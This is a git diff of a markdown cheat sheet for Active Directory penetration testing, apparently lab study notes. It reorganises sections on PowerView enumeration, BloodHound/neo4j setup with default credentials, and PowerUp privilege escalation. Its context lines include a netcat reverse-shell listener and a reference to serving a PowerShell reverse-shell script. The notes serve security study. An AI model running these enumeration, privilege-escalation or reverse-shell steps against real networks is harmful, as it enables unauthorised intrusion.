@@ -3,6 +3,10 @@
 * [General](#general)
 * [Enumeration](#enumeration)
   * [Enumeration using AD Module](#domain-enumeration-using-activedirectory-module)
+  * [Enumeration using PowerView](#domain-enumeration-using-powerview)
+  * [Bloodhound](#bloodhound)
+* [Privilege Escalation](#privilege-escalation)
+  * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)  
 
 ## General
 Connect to a machine with Administrator privileges
@@ -184,7 +188,7 @@ Get trusts of a forest
 Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
 ```
 
-### Domain Enumeration Using PowerView.ps1
+### Domain Enumeration Using PowerView
 Enumeration of domain information
 ```
 Get-Domain 
@@ -267,7 +271,7 @@ Check if AD rights are binded to a specific group instead of users
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<Group_name>"}
 ```
 
-**Enumerate the Domain Trust using PowerView.ps1**
+**Enumerate the Domain Trust using PowerView**
 Enumerate all the domains in the forest
 ```
 Get-ForestDomain -Verbose
@@ -323,8 +327,31 @@ Get all fileservers on the domain
 Get-NetFileServer
 ```
 
+## BloodHound
+### Install neo4j
+Open cmd as Administrator and open the following directory
+```
+cd C:\AD\Tools\neo4j-community-4.1.1-windows\neo4j-community-4.1.1\bin
+```
+
+Install neo4j
+```
+neo4j.bat install-service
+```
+
+Start neo4j service
+```
+neo4j.bat start 
+```
+
+Browse to http://localhost:7474 and login using the following credentials
+user: neo4j
+password: bloodhound
+
 ## Privilege Escalation
-### Local Admin Privilege Escalation using PowerUp.ps1
+### Useful tools 
+- [PowerUP](#https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+### Local Admin Privilege Escalation using PowerUp
 Load the PowerUp.ps1 module
 ```
 . .\PowerUp.ps1
@@ -374,27 +401,6 @@ nc64.exe -lvp 443
 ```
 
 **Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)
-
-## BloodHound
-### Install neo4j
-Open cmd as Administrator and open the following directory
-```
-cd C:\AD\Tools\neo4j-community-4.1.1-windows\neo4j-community-4.1.1\bin
-```
-
-Install neo4j
-```
-neo4j.bat install-service
-```
-
-Start neo4j service
-```
-neo4j.bat start 
-```
-
-Browse to http://localhost:7474 and login using the following credentials
-user: neo4j
-password: bloodhound
 
 ## Lateral Movement
 Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 
